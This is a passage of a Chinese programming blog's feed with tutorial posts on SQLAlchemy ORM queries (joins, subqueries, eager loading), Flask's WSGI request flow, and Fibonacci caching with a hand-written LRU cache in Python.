class="string">'1111111111@xx.com'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; &lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p><p><code>Query.join()</code>知道如何连接<code>User</code> ，<code>Address</code>因为它们之间只有一个外键。如果没有外键或多个外键，<code>Query.join()</code>则在使用下列其中一种形式时效果更好：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query.join(Address, User.id==Address.user_id)    <span class="comment"># explicit condition</span></span><br><span class="line">query.join(User.addresses)                       <span class="comment"># specify relationship from left to right</span></span><br><span class="line">query.join(Address, User.addresses)              <span class="comment"># same, with explicit target</span></span><br><span class="line">query.join(<span class="string">'addresses'</span>)                          <span class="comment"># same, using a string</span></span><br></pre></td></tr></table></figure></p><p><code>Query</code>如果有多个实体，选择什么？<br><code>Query.join()</code>方法<strong>通常会从</strong>实体列表中<strong>最左边的项加入，</strong>省略ON子句或ON子句是普通SQL表达式时。要控制JOIN列表中的第一个实体，使用<code>Query.select_from()</code>方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query = session.query(User, Address).select_from(Address).join(User)</span><br></pre></td></tr></table></figure></p><h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy.sql <span class="keyword">import</span> func</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stmt = session.query(Address.user_id, func.count(<span class="string">'*'</span>).\</span><br><span class="line">            label(<span class="string">'address_count'</span>)).\</span><br><span class="line">            group_by(Address.user_id).subquery()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> u, count <span class="keyword">in</span> session.query(User, stmt.c.address_count).\</span><br><span class="line">        outerjoin(stmt, User.id==stmt.c.user_id).order_by(User.id):</span><br><span class="line">        print(u, count)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; <span class="keyword">None</span></span><br><span class="line">&lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; <span class="keyword">None</span></span><br><span class="line">&lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; <span class="keyword">None</span></span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; <span class="number">2</span></span><br><span class="line">&lt;User(name=<span class="string">'None'</span>, fullname=<span class="string">'None'</span>, password=<span class="string">'None'</span>)&gt; <span class="keyword">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User, stmt.c.address_count).\</span><br><span class="line">        outerjoin(stmt, User.id==stmt.c.user_id).order_by(User.id)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password, anon_1.address_count AS anon_1_address_count </span><br><span class="line">FROM users LEFT OUTER JOIN (SELECT addresses.user_id AS user_id, count(%s) AS address_count </span><br><span class="line">FROM addresses GROUP BY addresses.user_id) AS anon_1 ON users.id = anon_1.user_id ORDER BY users.id</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>如果希望子查询映射到实体？可以使用<code>aliased()</code> 将映射类的“别名”关联到子查询：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stmt = session.query(Address).\</span><br><span class="line">                    filter(Address.email_address != <span class="string">'j25@yahoo.com'</span>).\</span><br><span class="line">                    subquery()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>adalias = aliased(Address, stmt)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> user, address <span class="keyword">in</span> session.query(User, adalias).\</span><br><span class="line">            join(adalias, User.addresses):</span><br><span class="line">        print(user)</span><br><span class="line">        print(address)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;</span><br></pre></td></tr></table></figure></p><h2 id="常见关系运算符"><a href="#常见关系运算符" class="headerlink" title="常见关系运算符"></a>常见关系运算符</h2><ul><li><p><code>__eq__()</code>（多对一“等于”比较）：</p><p>  <code>query.filter(Address.user == someuser)</code></p></li><li><p><code>__ne__()</code>（多对一“不等于”比较）：</p><p><code>query.filter(Address.user != someuser)</code></p></li><li><p>IS NULL（多对一比较，也可使用<code>__eq__()</code>)    </p></li><li><p> <code>query.filter(Address.user == None</code>)</p></li><li><p><code>contains()</code>（用于一对多集合）：</p><p><code>query.filter(User.addresses.contains(someaddress))</code></p></li><li><p><code>any()</code>（用于集合）：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query.filter(User.addresses.any(Address.email_address == &apos;bar&apos;))</span><br><span class="line"></span><br><span class="line"># also takes keyword arguments:</span><br><span class="line">query.filter(User.addresses.any(email_address=&apos;bar&apos;))</span><br></pre></td></tr></table></figure></li><li><p><code>has()</code>（用于标量参考）：</p><p><code>query.filter(Address.user.has(name=&#39;ed&#39;))</code></p></li><li><p><code>Query.with_parent()</code>（用于任何关系）：</p><p><code>session.query(Address).with_parent(someuser, &#39;addresses&#39;)</code></p></li></ul><h2 id="急切加载"><a href="#急切加载" class="headerlink" title="急切加载"></a>急切加载</h2><p>如果没有指定关系加载的方式，默认是延迟加载，例如上面的User.addresses,如果要在查询时加载关系，需要使用<code>Query.options()</code>指定加载的方式</p><h3 id="子查询加载"><a href="#子查询加载" class="headerlink" title="子查询加载"></a>子查询加载</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> subqueryload</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg = session.query(User).\</span><br><span class="line">                    options(subqueryload(User.addresses)).\</span><br><span class="line">                    filter_by(name=<span class="string">'hg'</span>).one()</span><br><span class="line"></span><br><span class="line">SELECT users.id AS users_id,</span><br><span class="line">        users.name AS users_name,</span><br><span class="line">        users.fullname AS users_fullname,</span><br><span class="line">        users.password AS users_password</span><br><span class="line">FROM users</span><br><span class="line">WHERE users.name = ?</span><br><span class="line">SELECT addresses.id AS addresses_id,</span><br><span class="line">        addresses.email_address AS addresses_email_address,</span><br><span class="line">        addresses.user_id AS addresses_user_id,</span><br><span class="line">        anon_1.users_id AS anon_1_users_id</span><br><span class="line">FROM (SELECT users.id AS users_id</span><br><span class="line">    FROM users WHERE users.name = ?) AS anon_1</span><br><span class="line">JOIN addresses ON anon_1.users_id = addresses.user_id</span><br><span class="line">ORDER BY anon_1.users_id, addresses.id</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg.addresses</span><br><span class="line">[&lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;, &lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;]</span><br></pre></td></tr></table></figure><h3 id="加入载入"><a href="#加入载入" class="headerlink" title="加入载入"></a>加入载入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> joinedload</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg = session.query(User). \</span><br><span class="line">options(joinedload(User.addresses)).\</span><br><span class="line">filter(User.name == <span class="string">'hg'</span>).one()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg.addresses</span><br><span class="line">[&lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;, &lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User). \</span><br><span class="line">options(joinedload(User.addresses)).\</span><br><span class="line">filter(User.name == <span class="string">'hg'</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password, addresses_1.id AS addresses_1_id, addresses_1.email_address AS addresses_1_email_address, addresses_1.user_id AS addresses_1_user_id </span><br><span class="line">FROM users LEFT OUTER JOIN addresses AS addresses_1 ON users.id = addresses_1.user_id </span><br><span class="line">WHERE users.name = %s</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><em><a href="http://docs.sqlalchemy.org/en/latest/orm/" target="_blank" rel="noopener">http://docs.sqlalchemy.org/en/latest/orm/</a></em></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;不做就别做，要做就坚持下去&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;记录下sqlalchemy中常用的操作，其它很多框架的ORM也是对sqlalchemy的包装，因此这些方法在框架中也是可用的&lt;br&gt;&lt;img src=&quot;http://p5m1dtoh7.bkt.clouddn.com/sqlaLchemy-ORM%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/sqlalchemy.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="sqlalchemy" scheme="http://longofo.cc/categories/sqlalchemy/"/>
    
    
      <category term="sqlalchemy -ORM" scheme="http://longofo.cc/tags/sqlalchemy-ORM/"/>
    
  </entry>
  
  <entry>
    <title>flask基本处理流程</title>
    <link href="http://longofo.cc/flask%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B.html"/>
    <id>http://longofo.cc/flask基本处理流程.html</id>
    <published>2018-06-22T04:18:44.000Z</published>
    <updated>2018-06-22T04:42:54.318Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">也许一个人在真正无可奈何的时候，除了微笑，也只好微笑了</blockquote><blockquote><p>搜集了一些资料,对flask处理流程有个宏观上的认识<br><img src="http://p5m1dtoh7.bkt.clouddn.com/flask%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B/20170111161405603.png" alt=""></p></blockquote><a id="more"></a><h2 id="WSGI"><a href="#WSGI" class="headerlink" title="WSGI"></a>WSGI</h2><p><code>WSGI</code>，全称 <code>Web Server Gateway Interface</code>，或者 <code>Python Web Server Gateway Interface</code> ，是为 <code>Python</code> 语言定义的 <code>Web</code> 服务器和 <code>Web</code> 应用程序或框架之间的一种简单而通用的接口。它是一个<code>Gateway</code>，也就是网关。网关的作用就是在协议之间进行转换。</p><p>很多框架都自带了 <code>WSGI server</code> ，比如 <code>Flask</code>，<code>webpy</code>，<code>Django</code>等。但是性能不好，自带的     <code>web server</code> 更多的是测试用途，发布时则使用生产环境的 <code>WSGI server</code>或者是联合 <code>nginx 做 uwsgi</code>。</p><p>在网上看到一张图有助于理解:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/flask%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B/20170111120835003.png" alt=""></p><p><code>WSGI</code>的使用方法实际上是包含在<code>APP</code>里面的，最右端的<code>app</code>实际上应该指的是逻辑功能，包括<code>URL</code>和<code>view function</code>的对应关系。</p><p><code>WSGI</code>其实是作为一个接口，来接受<code>Server</code>传递过来的信息, 然后通过这个接口调用后台<code>app</code>里的<code>view function</code>进行响应。</p><h2 id="flask基本处理流程"><a href="#flask基本处理流程" class="headerlink" title="flask基本处理流程"></a>flask基本处理流程</h2><p>处理关键步骤:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/flask%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B/20170111161405603.png" alt=""></p><p><em>注: environ为http的相关信息，如请求头等, start_response是响应信息</em></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;也许一个人在真正无可奈何的时候，除了微笑，也只好微笑了&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;搜集了一些资料,对flask处理流程有个宏观上的认识&lt;br&gt;&lt;img src=&quot;http://p5m1dtoh7.bkt.clouddn.com/flask%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B/20170111161405603.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="flask" scheme="http://longofo.cc/categories/flask/"/>
    
    
      <category term="flask" scheme="http://longofo.cc/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>使用缓存优化斐波那契</title>
    <link href="http://longofo.cc/%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98%E4%BC%98%E5%8C%96%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91.html"/>
    <id>http://longofo.cc/使用缓存优化斐波那契.html</id>
    <published>2018-06-15T12:37:24.000Z</published>
    <updated>2020-08-03T10:31:25.674Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>网上看到某位大佬讲这个,自己也动手写写</p></blockquote><a id="more"></a><h2 id="cache优化"><a href="#cache优化" class="headerlink" title="cache优化"></a>cache优化</h2><p>通过缓存，如果计算过的值在缓存中，就不需要重复计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cache</span><span class="params">(func)</span>:</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">    @wraps(func)  # 消除装饰的副作用</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> n <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">            result = func(n)</span><br><span class="line">            data[n] = result</span><br><span class="line">        <span class="keyword">return</span> data[n]</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@cache</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_use_cache</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib_use_cache(n - <span class="number">2</span>) + fib_use_cache(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_none_cache</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib_none_cache(n - <span class="number">2</span>) + fib_none_cache(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># none cache</span></span><br><span class="line">    print(<span class="string">'none cache'</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        print(fib_none_cache(i))</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(<span class="string">'cost time:&#123;&#125;'</span>.format(end_time - start_time))</span><br><span class="line">    print(<span class="string">'-'</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># use cache</span></span><br><span class="line">    print(<span class="string">'use cache'</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        print(fib_use_cache(i))</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(<span class="string">'cost time:&#123;&#125;'</span>.format(end_time - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="缓存有限，使用LRUcache优化"><a href="#缓存有限，使用LRUcache优化" class="headerlink" title="缓存有限，使用LRUcache优化"></a>缓存有限，使用LRUcache优化</h2><p>使用双端链表加快添加和删除<br>使用LRU算法，维护最近使用过的，移除最近未使用的</p><p>大致流程:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/LRUcache/LRUcache.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, prev=None, next=None, key=None, value=None)</span>:</span></span><br><span class="line">        self.prev = prev</span><br><span class="line">        self.next = next</span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用循环双端链表,做到O(1)的删除和添加</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CircularDoubleLinkList</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.root_node = Node()</span><br><span class="line">        self.root_node.prev, self.root_node.next = self.root_node, self.root_node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">head_node</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.root_node.next</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tail_node</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.root_node.prev</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self, node)</span>:</span></span><br><span class="line">        tail_node = self.tail_node()</span><br><span class="line">        tail_node.next = node</span><br><span class="line">        node.prev = tail_node</span><br><span class="line">        node.next = self.root_node</span><br><span class="line">        self.root_node.prev = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self, node)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> node <span class="keyword">is</span> self.root_node:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        node.prev.next = node.next</span><br><span class="line">        node.next.prev = node.prev</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, max_size=<span class="number">16</span>)</span>:</span></span><br><span class="line">        self.max_size = max_size</span><br><span class="line">        self.cache = &#123;&#125;</span><br><span class="line">        self.access = CircularDoubleLinkList()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_full</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(self.cache) &gt;= self.max_size</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, func)</span>:</span></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(n)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> n <span class="keyword">in</span> self.cache:  <span class="comment"># 在缓存中</span></span><br><span class="line">                node = self.cache[n]</span><br><span class="line">                self.access.remove(node)</span><br><span class="line">                self.access.append(node)</span><br><span class="line">                res = node.value</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># 不在缓存中</span></span><br><span class="line">                new_value = func(n)</span><br><span class="line">                res = new_value</span><br><span class="line">                new_node = Node(key=n, value=new_value)</span><br><span class="line">                self.cache[n] = new_node</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> self.is_full():  <span class="comment"># 缓存full</span></span><br><span class="line">                    rm_node = self.access.head_node()</span><br><span class="line">                    self.access.remove(rm_node)</span><br><span class="line">                    <span class="keyword">del</span> self.cache[rm_node.key]</span><br><span class="line">                self.access.append(new_node)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@LRUCache()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_use_lrucache</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib_use_lrucache(n - <span class="number">1</span>) + fib_use_lrucache(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_none_cache</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib_none_cache(n - <span class="number">1</span>) + fib_none_cache(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># none cache</span></span><br><span class="line">    print(<span class="string">'none cache'</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        print(fib_none_cache(i))</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(<span class="string">'cost time:&#123;&#125;'</span>.format(end_time - start_time))</span><br><span class="line">    print(<span class="string">'-'</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># use lrucache</span></span><br><span class="line">    print(<span class="string">'use lrucache'</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        print(fib_use_lrucache(i))</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(<span class="string">'cost time:&#123;&#125;'</span>.format(end_time - start_time))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;当你觉得很累的时候，说明你正在走上坡路。&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;网上看到某位大佬讲这个,自己也动手写写&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
